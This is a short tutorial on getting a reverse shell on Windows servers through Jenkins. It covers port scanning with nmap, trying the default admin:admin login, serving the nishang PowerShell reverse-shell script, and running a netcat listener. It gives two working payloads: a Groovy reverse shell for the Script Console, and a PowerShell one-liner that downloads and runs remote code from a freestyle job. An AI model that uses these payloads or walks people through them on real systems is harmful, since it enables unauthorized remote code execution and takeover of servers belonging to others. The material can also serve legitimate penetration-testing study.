# reverse-shell-via-Jenkins

Simple scenario of how we can gain access to Windows web servers using admin account on Jenkins.


## Ports scanning

Scan an IP address like this:
```
nmap -sV -sC -oA <some_IP>
```
Note: It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection.
The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.


Let's say, you found open 8080 port with Jetty as a service and Windows web page on port 80.

You can be almost sure it's Jenkins. 

This application is running on 8080 as a default port and Jetty is an internal web container that Jenkins is using to has the ability to serve HTTPS as one of the methods of authentication.

Access `http://<IP_address>:8080` and check if Jenkins login panel is avaliable.
If yes, then go to the next step `Login`.


## Login

Default credentials to Jenkins are admin:admin. Try it.

If you gained admin access to Jenkins, you can do almost everything. 

Now, it's time to get a reverse shell.


## Gain reverse shell

Let's try to execute some code to get initial shell to Windows web server via Jenkins.

First of all, use nishang script to gain reverse shell on Windows. Download this script on local machine:
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

Sceondly, run Python webserver in the same directory that you've been downloading script mentioned above.

```
python -m http.server
```
This command will start web server on default port with is 80.
If you want to change port, define it at the end of command.
```
python -m http.server <port>
```


The last this you should prepare is to start `netcat` listener on your local machine:
```
nc -lvnp <random_port>
```


## Run code via Jenkins

There is a coupe of ways to do it:

### First scenario:

1. Go to `Manage Jenkins` -> `Script Console`
2. Add Groovy script to execute this code on Windows machine:

```
Thread.start {
String host="<your_machine_IP>";
int port=<your_webserver_port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```
3. Run script and you should have session open in your listener.

### Second scenario:

1. Go to `New Item` -> `Freestyle job` -> `Execute Windows batch command`.
2. Add Powershell code:

```
powershell iex (New-Object Net.WebClient).DownloadString(‘http://<your_machine_IP>:<your_webserver_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <your_machine_IP>-Port <your_listener_port>
```
3. Save new job configuration with `Apply`.
4. Run job clicking `Build now` and you should have session open in your listener after job is completed.






